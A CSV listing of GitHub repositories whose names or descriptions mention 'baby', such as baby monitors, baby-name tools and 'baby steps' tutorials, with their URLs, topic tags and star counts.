,Url,Description,Topics,Stars
16,https://github.com/panacloud-modern-global-apps/jamstack-serverless.git,"Learn JAMstack Serverless Modern App Development in Baby Steps using Gatsby.js, React, TypeScript, GraphQL, Contentful, Netlify, FaunaDB, MongoDB, Apollo, Github Actions, Project Fugu, and CSS Houdini.","jamstack,gatsby,serverless,netlify,netlify-functions,faunadb,contentful,github-actions,react,graphql,apollo-server,mongodb-atlas",180
17,https://github.com/build-canaries/nevergreen.git,:baby_chick: A build monitor with attitude,"monitor,continuous-delivery,continuous-deployment,continuous-integration,cctray,gocd,jenkins,circleci,redux,ci,cd,ci-cd,react,saas,travis-ci,cruisecontrol,continuous-testing",175
18,https://github.com/mikedewar/d3talk.git,baby steps in d3.js,,173
19,https://github.com/elight/coulda.git,"Given-when-then for Test::Unit (or ""If shoulda and cucumber had a baby"")",,145
20,https://github.com/coolnameismy/BabyBluetooth-swift.git,":baby: BabyBluetooth swift 版本，The easiest way to use Bluetooth (BLE )in ios,even bady can use. 简单易用的蓝牙库，基于CoreBluetooth的封装，并兼容ios和mac osx.",,141
21,https://github.com/giulbia/baby_cry_detection.git,Recognition of baby cry audio signal,,134
22,https://github.com/panacloud-modern-global-apps/full-stack-serverless-cdk.git,Learn to Build Full-Stack Serverless Apps and APIs using AWS Cloud Development Kit (CDK) in Baby Steps.,"serverless,serverless-saas,lambda-functions,appsync,eventbridge,dynamodb,aws-cdk,aws",129
23,https://github.com/onestraw/qiming.git,:baby:起名助手,,122
24,https://github.com/adishavit/Terminators.git,"Hasta la vista, baby!",,120
25,https://github.com/zcash-hackworks/babyzoe.git,Baby ZoE - first step towards Zerocash over Ethereum,,113
26,https://github.com/hadley/babynames.git,An R package containing US baby names from the SSA,"r,data",112
27,https://github.com/ivadim/fruitnanny.git,Raspberry PI based baby monitor,"raspberry-pi-camera,raspberrypi,raspberry-pi",96
28,https://github.com/initc3/babySNARK.git,Baby SNARK (do do dodo dodo),,91
29,https://github.com/HelipengTony/Zeo_UC.git,A Powerful WordPress :baby:User Center :baby: | Under development,"php,js,jqeury,javascript,wordpress",66
30,https://github.com/RisingStack/react-baby-steps.git,Zero to Redux through Flux (with Rx) in baby steps,,66
31,https://github.com/geerlingguy/baby-safe-temp.git,"{""Safe temperature monitor for baby's room. Made for Raspberry Pi Pico.""}",,64
32,https://github.com/jasaw/bbPiCam.git,Raspberry Pi Baby Monitor,,63
33,https://github.com/webrtcHacks/webrtc_baby_monitor.git,A motion detecting baby monitor from webrtcHacks,,59
34,https://github.com/beaufortfrancois/sandbox.git,:baby_chick:,"web-bluetooth,media-session-api,image-capture,media-capabilities",57
35,https://github.com/sealyun/lvscare.git,"A lightweight LVS baby care, support ipvs health check",,57
36,https://github.com/panacloud/learn-typed-express.git,Learning Express 5 using Typescript in Baby Steps.,,56
37,https://github.com/XueSeason/SanjiangShopping.git,:baby_chick: 仅仅只是个 UI,,55
38,https://github.com/brarcher/protect-baby-monitor.git,Android-based Baby Monitor,,52
39,https://github.com/ianhom/MOE.git,"MOE is an event-driven OS for 8/16/32-bit MCUs. MOE means ""Minds Of Embedded system"", It’s also the name of my lovely baby daughter   :sunglasses:","moe,multi-task,event-driven,easy-to-use,mcu,protothreads,schedule",46
40,https://github.com/baverman/snaked.git,"Snaked is dead baby, snaked is dead.",,44
41,https://github.com/panacloud/learn-typed-rxjs.git,Learn Reactive Programming with RxJS 5 and TypeScript in Baby Steps,,43
42,https://github.com/porridge/bambam.git,keyboard mashing and doodling game for babies,,42
43,https://github.com/avdi/cowsay.git,"Enter the cow, baby!",,42
44,https://github.com/sstephenson/s.git,Baby Scheme interpreter with tail calls and call/cc,,42
45,https://github.com/salman-bhai/hello-world.git,Hello-World! The baby steps to be a Programmer! Explore this repository to check out various languages in Computer Science and understand how to contribute to Open Source effectively and easily. Sending your first Pull Request is not hard and made easier by this repository!,"open-source,starter-project,c,languages,android,arnoldc,assembly,b,bash,boo,css,cpp,clojure,d,dart,erlang,hacktoberfest",42
46,https://github.com/jennschiffer/pixelChat.git,"{""it's like make8bitart.com and jsChat had a little baby""}",,41
47,https://github.com/nbremer/babyspikelivecoding.git,The code from my Live Coding talk in which I recreate the Baby Spike visual I made for the Scientific American magazine,,40
48,https://github.com/justjavac/baby-time.git,"{""🎁 gift for justjavac's baby""}","gift,javascript,justjavac",39
49,https://github.com/ChanceYu/mpapi.git,:baby_chick: 小程序API兼容插件，一次编写，多端运行。支持：微信小程序、支付宝小程序、百度智能小程序、字节跳动小程序,"miniprogram,weapp,api,wechat,alipay,baidu,toutiao",39
50,https://github.com/thyrlian/namedict.git,"Generate Chinese names for the newborn baby which are also applicable for multilingual pronunciation (English, and maybe Deutsch).",,38
51,https://github.com/dtanzer/babystepstimer.git,"A timer for the ""baby steps"" exercise/technique for doing TDD",,37
52,https://github.com/msbarry/babymap.git,Interactive visualization of most popular baby names by state from 1910-2015,,35
53,https://github.com/amandaharlin/babyharlin.git,:baby: little baby harlin ~ codename lbh :couplekiss:,,34
54,https://github.com/johnwu1114/chinese-name.git,Finding the perfect chinese name for your baby.,,33
55,https://github.com/philayres/babble-rnn.git,"babble-rnn is a research project in the use of machine learning to generate new speech by modelling human speech audio, without any intermediate text or word representations. The idea is to learn to speak through imitation, much like a baby might. ","python,keras,keras-neural-networks,jupyter-notebook,keras-models",33
56,https://github.com/WhatIThinkAbout/BabyRobot.git,"{""A Baby Robot's Guide to Reinforcement Learning""}",,32
57,https://github.com/latacora/caro.git,If jq and xargs had a baby,,30
58,https://github.com/babymm/mumu.git,baby慕慕 内容管理系统（CMS）、个人博客管理系统（blog）、办公自动化管理系统（oa）、新闻采集管理系统（news）,,30
59,https://github.com/nixzhu/SharedBaby.git,"{""Baby's web interface.""}",,29
60,https://github.com/Sha-Lab/babywalk.git,"PyTorch code for the ACL 2020 paper: ""BabyWalk: Going Farther in Vision-and-Language Navigationby Taking Baby Steps""",,29
61,https://github.com/es128/progeny.git,:baby: Recursively finds dependencies of style and template source files,,28
62,https://github.com/mikebarkmin/baby-tracker.git,A progressive web app to track your baby and share the data with your family in real-time.,"react,express,socketio,styled-components",27
63,https://github.com/karlicoss/dron.git,What if cron and systemd had a baby?,"systemd,cron,literate-readme,dsl,python",27
64,https://github.com/LuckFire/amoled-cord.git,"{""A theme that's nice on your eyes.. lights out baby!""}","powercord,powercord-theme,vizality,vizality-theme,discord,discord-theme,betterdiscord,betterdiscord-theme",26
65,https://github.com/falgon/htcc.git,:baby_chick: A tiny C language compiler (x86-64) (WIP),"tiny,compiler",26
66,https://github.com/jiuguangw/Agenoria.git,"{""Python utility for visualizing growth data from a newborn's first year, such as feeding, diapering, sleep, and growth, recorded in the Glow Baby app.""}","baby,visualization,timeseries,matplotlib,seaborn,pandas,medical,glow-baby",26
67,https://github.com/MisterJames/BootstrappingMvc.git,"{""This project is the evolution and progression of work as I walk through Bootstrap and get it fully integrated with Asp.Net Mvc 4. Not just at a CSS level either, baby, no siree! We're getting down and dirty with data templating, action filters and more.  Oh yes, there will be the awesome.""}",,25
